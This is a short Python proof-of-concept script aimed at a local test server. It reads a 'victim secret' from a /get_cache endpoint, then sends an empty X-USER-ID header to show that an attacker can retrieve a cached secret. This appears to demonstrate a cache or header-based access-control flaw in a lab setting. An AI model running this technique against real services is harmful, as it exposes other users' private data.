import requests
import time


URL = 'http://127.0.0.1:8000'
GET_URL = f"{URL}/get_cache"
POST_URL = f"{URL}/create_cache"
DELAY = 2

sess = requests.Session()

print(f"[+] Sending data without header")
victim_response = sess.get(GET_URL, )
try:
    victim_data = victim_response.json()
    print(f"[+] victim secret: {victim_data['secret']}\n")
except Exception:
    print(f"[-] Cannot read victim secret")

print(f"Waiting for {DELAY} seconds...\n")
time.sleep(2)

print(f"[+] Sending data with header \"X-USER-ID\": \"\"")
attacker_response = sess.get(GET_URL, headers={"X-USER-ID": ""})
try:
    attacker_data = attacker_response.json()
    print(f"[+] attacker secret: {attacker_data['secret']}\n")
except Exception:
    print(f"[-] Cannot read victim secret")

